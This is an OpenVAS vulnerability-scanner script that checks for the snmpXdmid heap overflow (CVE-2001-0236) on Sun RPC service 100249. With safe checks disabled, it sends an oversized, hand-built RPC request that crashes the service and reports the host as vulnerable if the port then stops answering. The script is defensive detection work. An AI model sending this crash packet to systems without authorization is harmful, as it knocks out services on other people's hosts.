# OpenVAS Vulnerability Test
# $Id: snmpXdmid.nasl 17 2013-10-27 14:01:43Z jan $
# Description: snmpXdmid overflow
#
# Authors:
# Intranode
#
# Copyright:
# Copyright (C) 2001 Intranode
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote RPC service 100249 (snmpXdmid) is vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.";

tag_solution = "disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch";

if(description)
{
 script_id(10659);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_xref(name:"IAVA", value:"2001-a-0003");
 script_bugtraq_id(2417);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_cve_id("CVE-2001-0236");
 
 name = "snmpXdmid overflow";
 
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "heap overflow through snmpXdmid";
 script_summary(summary);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright("This script is Copyright (C) 2001 Intranode");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("secpod_rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");


port = get_rpc_port(program:100249, protocol:IPPROTO_TCP);
if(port)
{
  if(safe_checks())
  {
   if ( report_paranoia == 0 ) exit(0);
  data = " 
The remote RPC service 100249 (snmpXdmid) may be vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch";
  security_hole(port:port, data:data);
  exit(0);
  }
  
  
  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x00, 0x00, 0x0F, 0x9C, 0x22, 0x7D,
	  	  0x93, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x02, 0x00, 0x01, 0x87, 0x99, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0xF1, 
		  0x28, 0x90, 0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F,
		  0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x06, 0x44, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00) +
		  crap(length:28000, data:raw_string(0x00));


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     sleep(1);
     soc2 = open_sock_tcp(port);
     if(!soc2)security_hole(port);
     else close(soc2);
   }
 }
}
